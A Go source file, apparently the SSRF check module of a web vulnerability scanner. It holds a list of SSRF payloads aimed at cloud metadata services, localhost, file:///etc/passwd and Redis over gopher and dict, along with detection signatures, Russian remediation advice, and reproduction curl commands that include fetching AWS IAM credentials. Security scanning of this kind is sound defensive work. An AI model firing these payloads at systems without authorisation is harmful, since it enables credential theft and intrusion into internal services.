package checks

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"vectrixgo/internal/crawler"
	"vectrixgo/internal/findings"
	"vectrixgo/internal/httpsession"
	"vectrixgo/internal/logging"
)

var ssrfURLParams = map[string]struct{}{
	"url": {}, "uri": {}, "link": {}, "src": {}, "source": {}, "dest": {}, "destination": {},
	"redirect": {}, "redirect_url": {}, "path": {}, "file": {}, "page": {}, "endpoint": {},
	"host": {}, "server": {}, "callback": {}, "webhook": {}, "feed": {}, "fetch": {},
	"proxy": {}, "target": {}, "next": {}, "location": {}, "ref": {}, "image_url": {},
	"avatar": {}, "logo": {}, "icon": {}, "document": {}, "pdf": {}, "report": {},
}

type ssrfPayload struct {
	payload string
	label   string
}

var ssrfPayloads = []ssrfPayload{
	{"http://127.0.0.1/", "localhost HTTP"},
	{"http://localhost/", "localhost alias"},
	{"http://169.254.169.254/latest/meta-data/", "AWS metadata"},
	{"http://169.254.169.254/metadata/instance", "Azure metadata"},
	{"http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"},
	{"http://[::1]/", "IPv6 localhost"},
	{"http://0.0.0.0/", "0.0.0.0 (all interfaces)"},
	{"http://0/", "short localhost"},
	{"http://2130706433/", "localhost as decimal IP"},
	{"http://0177.0.0.1/", "localhost as octal"},
	{"dict://127.0.0.1:6379/info", "Redis dict://"},
	{"file:///etc/passwd", "file:// LFI"},
	{"gopher://127.0.0.1:6379/_PING%0D%0A", "Redis via gopher"},
}

var metadataSignatures = []*regexp.Regexp{
	regexp.MustCompile(`(?i)ami-[a-z0-9]{8,17}`),
	regexp.MustCompile(`(?i)instance-id`),
	regexp.MustCompile(`(?i)iam/security-credentials`),
	regexp.MustCompile(`(?i)"computeMetadata"`),
	regexp.MustCompile(`(?i)compute/v1/instances`),
	regexp.MustCompile(`(?i)metadata\.google\.internal`),
	regexp.MustCompile(`(?i)169\.254\.169\.254`),
	regexp.MustCompile(`(?i)root:.*:0:0:`),
	regexp.MustCompile(`(?i)\+OK\s+Redis`),
}

// RunSSRF probes URL-like query parameters with SSRF payloads (cloud metadata,
// localhost, file://, gopher://) and looks for metadata-leak signatures or
// blind-SSRF status-code differentials. Mirrors modules/checks/ssrf.py run().
func RunSSRF(session *httpsession.Session, baseURL string, endpoints []crawler.Endpoint, store *findings.FindingStore) {
	logging.Println("[*] Checking SSRF...")
	curlAuth := session.CurlAuthFlags(baseURL)

	for _, ep := range endpoints {
		checkEndpointSSRF(session, ep, curlAuth, store)
	}
}

func checkEndpointSSRF(session *httpsession.Session, ep crawler.Endpoint, curlAuth string, store *findings.FindingStore) {
	parsed, err := url.Parse(ep.URL)
	if err != nil {
		return
	}
	qs := parsed.Query()

	for param, vals := range qs {
		if len(vals) == 0 {
			continue
		}
		if _, ok := ssrfURLParams[strings.ToLower(param)]; !ok {
			continue
		}
		baseline, err := session.Get(ep.URL, nil)
		if err != nil {
			continue
		}
		baselineCode := baseline.StatusCode

		for _, sp := range ssrfPayloads {
			newQS := cloneValues(qs)
			newQS.Set(param, sp.payload)
			newU := *parsed
			newU.RawQuery = newQS.Encode()
			newU.Fragment = ""
			testURL := newU.String()

			resp, err := session.Request("GET", testURL, httpsession.Options{AllowRedirects: true, Timeout: 8 * time.Second})
			if err != nil {
				continue
			}

			matched := false
			for _, sig := range metadataSignatures {
				loc := sig.FindStringIndex(resp.Body)
				if loc == nil {
					continue
				}
				matchText := resp.Body[loc[0]:loc[1]]

				f := findings.NewFinding(
					fmt.Sprintf("SSRF (Server-Side Request Forgery) — параметр '%s'", param),
					findings.Critical,
					"SSRF",
					"CWE-918",
					ep.URL,
					fmt.Sprintf("Параметр '%s' позволяет серверу делать HTTP-запросы к внутренним ресурсам.\n"+
						"Техника: %s\n"+
						"В ответе обнаружены признаки доступа к внутреннему сервису или метаданным облака.", param, sp.label),
					"1. Валидируйте и разрешайте только ожидаемые схемы (https://) и домены.\n"+
						"2. Запретите запросы к RFC-1918 адресам (10.x, 172.16.x, 192.168.x, 127.x).\n"+
						"3. Запретите запросы к 169.254.169.254 на уровне сети/iptables.\n"+
						"4. Используйте SSRF-safe HTTP-клиент с проверкой IP назначения.\n"+
						"5. Отключите неиспользуемые URL-схемы (file, gopher, dict, ftp).",
					fmt.Sprintf("curl -sk %s '%s'\n\n# AWS metadata через SSRF:\ncurl -sk %s "+
						"'%s?%s=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
						curlAuth, testURL, curlAuth, ep.URL, param),
				)
				f.Parameter = param
				f.Evidence = fmt.Sprintf("Payload: %s\nНайдено в ответе: %s\nHTTP status: %d",
					sp.payload, truncate(matchText, 200), resp.StatusCode)
				store.Add(f)
				matched = true
				break
			}
			if matched {
				break
			}

			// Weak signal: status-code differential — route through adaptive
			// confirmation before publishing.
			if resp.StatusCode == 200 && baselineCode != 200 && len(resp.Body) > 200 {
				f := findings.NewFinding(
					fmt.Sprintf("Потенциальный Blind SSRF — параметр '%s'", param),
					findings.Low,
					"SSRF",
					"CWE-918",
					ep.URL,
					fmt.Sprintf("Запрос с payload '%s' в параметре '%s' "+
						"вернул HTTP 200, тогда как базовый запрос вернул %d. "+
						"Само по себе изменение статус-кода — слабый индикатор (могло быть "+
						"вызвано форматом значения параметра, а не реальным исходящим запросом).",
						sp.payload, param, baselineCode),
					"1. Запретите серверу делать исходящие запросы к произвольным URL.\n"+
						"2. Используйте allowlist для разрешённых адресов назначения.",
					fmt.Sprintf("# Используйте interactsh для blind SSRF:\n"+
						"# 1. interactsh-client -v -o /tmp/interactsh.log &\n"+
						"# 2. Замените payload на ваш interactsh URL:\n"+
						"curl -sk %s '%s?%s=https://YOUR.oast.me/'\n"+
						"# 3. Проверьте /tmp/interactsh.log на входящие запросы", curlAuth, ep.URL, param),
				)
				f.Parameter = param
				f.Evidence = fmt.Sprintf("Baseline: %d\nSSRF probe: %d", baselineCode, resp.StatusCode)

				probeFn := func(probePayload string) (*httpsession.Response, error) {
					newQS := cloneValues(qs)
					newQS.Set(param, probePayload)
					newU := *parsed
					newU.RawQuery = newQS.Encode()
					newU.Fragment = ""
					return session.Request("GET", newU.String(), httpsession.Options{AllowRedirects: true, Timeout: 8 * time.Second})
				}

				store.AddCandidate(&findings.Candidate{
					Finding: f,
					Kind:    "ssrf",
					Context: map[string]any{"payload": sp.payload, "param": param, "probe": probeFn},
				})
			}
		}
	}
}
